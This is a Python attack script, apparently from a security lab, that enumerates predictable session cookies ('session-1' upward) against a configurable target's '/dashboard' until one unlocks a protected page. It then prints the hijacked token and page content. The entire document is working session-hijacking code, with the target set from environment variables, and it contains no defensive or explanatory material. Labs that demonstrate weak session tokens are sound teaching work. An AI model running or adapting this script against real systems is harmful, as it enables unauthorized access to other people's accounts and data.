import os
import time
import requests
from dotenv import load_dotenv

load_dotenv("config.env")

TARGET_HOST = os.getenv("TARGET_HOST", "http://vulnerable-app:5000")
TARGET_PATH = os.getenv("TARGET_PATH", "/dashboard")
START_ID = int(os.getenv("START_ID", "1"))
END_ID = int(os.getenv("END_ID", "200"))
SLEEP = float(os.getenv("SLEEP", "0.5"))

URL = TARGET_HOST.rstrip("/") + TARGET_PATH

print(f"Attacker: Targeting {URL}")
print(f"Enumerating session IDs from {START_ID} to {END_ID}")

for i in range(START_ID, END_ID + 1):
    token = f"session-{i}"
    cookies = {"session": token}
    try:
        r = requests.get(URL, cookies=cookies, timeout=5)
    except Exception as e:
        print("Request error:", e)
        time.sleep(SLEEP)
        continue

    if r.status_code == 200 and "Protected Dashboard" in r.text:
        print(f"[+] Valid session token found: {token}")
        print(f"[+] Dashboard response snippet: {r.text[:200]!s}")
        break
    else:
        print(f"Trying {token}: status {r.status_code}")
    time.sleep(SLEEP)

print("Attacker script finished.")
